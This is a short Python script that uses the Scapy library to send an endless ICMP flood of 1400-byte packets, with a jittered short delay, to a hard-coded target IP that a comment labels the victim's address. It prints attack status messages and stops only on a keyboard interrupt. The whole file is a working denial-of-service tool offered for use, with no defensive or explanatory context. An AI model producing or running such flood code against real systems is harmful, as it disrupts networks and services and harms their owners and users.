from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
import time
import os
import random

target_ip = "192.168.0.12"  # Change this to victim's IP
packet_size = 1400  # Size of payload
delay = 0.0001  # Time between packets

print(f"[+] Sending ICMP flood to {target_ip}...")

try:
    while True:
        pkt = IP(dst=target_ip)/ICMP()/("X" * packet_size)
        send(pkt, verbose=0)
        time.sleep(delay * random.uniform(0.2, 0.6))
except KeyboardInterrupt:
    print("\n[!] Attack stopped by user.")
